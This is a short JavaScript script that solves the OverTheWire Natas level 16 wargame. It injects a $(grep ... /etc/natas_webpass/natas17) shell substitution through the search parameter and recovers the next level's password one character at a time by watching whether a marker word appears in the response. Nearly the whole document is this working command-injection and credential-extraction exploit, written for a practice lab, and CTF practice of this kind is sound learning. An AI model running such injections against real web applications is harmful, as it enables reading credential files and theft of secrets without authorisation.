//$(grep -E [a-zA-Z0-9]{32} /etc/natas_webpass/natas17)elephant

//JS URL encode function
//https://www.w3schools.com/jsref/jsref_encodeuri.asp

charset = "0123456789" + "ABCDEFGHIJKLMNOPQRSTUVWXYZ" + "abcdefghijklmnopqrstuvwxyz";
pass_len = 32; //Password length
falsestring = "elephant";
passwd = "";

while (passwd.length < pass_len) {
	
	for (i=0;i<charset.length;i++) {
		(function(i) {
		url = `http://natas16.natas.labs.overthewire.org/?needle=$(grep -E ${passwd+charset[i]}[a-zA-Z0-9]{${pass_len-passwd.length-1}} /etc/natas_webpass/natas17)elephant&submit=Search`;
		xhr = new XMLHttpRequest();
		xhr.open('GET',encodeURI(url),true);
		xhr.onload = function () {
			if (!this.responseText.includes(falsestring)) {
				console.log(`Password character found: ${charset[i]}`);
				passwd += charset[i];
			};
		};
		xhr.send();
		})(i);
	};
	await new Promise(resolve => setTimeout(resolve, 2000)); // 2 sec. Increase delay if it doesn't work for you.
};
console.log(`Password is ${passwd}`);